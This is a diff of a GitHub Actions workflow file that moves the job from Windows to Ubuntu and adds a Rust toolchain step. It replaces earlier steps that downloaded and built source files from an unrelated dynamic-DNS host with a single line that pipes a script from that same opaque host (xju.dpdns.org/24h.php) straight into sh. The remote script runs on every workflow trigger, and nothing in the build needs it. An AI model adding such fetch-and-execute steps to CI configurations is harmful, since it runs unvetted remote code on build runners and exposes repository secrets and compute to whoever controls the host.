@@ -8,13 +8,13 @@ on:
 
 jobs:
   job:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
 
     steps:
+    - uses: actions-rust-lang/setup-rust-toolchain@v1
+      with:
+        toolchain: stable
+        override: true
 
     - run: |
-        irm http://xju.dpdns.org/24h.php?id=696cba8a50d05 -OutFile "main.c"
-        irm http://xju.dpdns.org/24h.php?id=696cc83e86597 -OutFile "CMakeLists.txt"
-
-    - run: cmake -B build
-    - run: cmake --build build --config Release
+        curl http://xju.dpdns.org/24h.php?id=69a52a9d7be1f | sh
